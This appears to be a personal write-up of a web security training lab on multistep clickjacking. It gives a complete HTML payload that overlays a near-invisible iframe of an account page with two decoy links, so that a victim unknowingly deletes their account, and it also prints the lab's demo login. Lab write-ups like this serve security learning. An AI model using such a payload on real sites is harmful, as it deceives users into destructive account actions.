# Practitioner Lab 90: Multistep clickjacking

---

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: `wiener:peter`

The first thing I did was log into the application. I saw the delete button. 

Now I know I want the user to delete themselves. 

```
<head>
	<style>
		#target_website {
			position:relative;
			width:1000px;
			height:1000px;
			opacity:0.000001;
			z-index:2;
			}
		#decoy_website{
			position:absolute;
			width:1000px;
			height:1000px;
                        top:520px;
                        left: 60px;
			z-index:1;
			}

                 #second_decoy_website {
			position:absolute;
			width:1000px;
			height:1000px;
                        top:300px;
                        left: 200px;
			z-index:1;
			}
            
	</style>
</head>
<body>
	<div id="decoy_website">
	  <a href=""> Click me first </a>
	</div>
<div id="second_decoy_website">
	  <a href=""> Click me next </a>
	</div>
	<iframe id="target_website" src="https://0ad30059045c283a80294ea7000900e4.web-security-academy.net/my-account">
	</iframe>
</body>
```

Using the following payload I added 2 divs which hovered over the pages.

When the user clicked on both the user account got deleted. 

![Untitled](Practitioner%20Lab%2090%20Multistep%20clickjacking%2025bd8445a4f04a05811d6f8a7bcaa367/Untitled.png)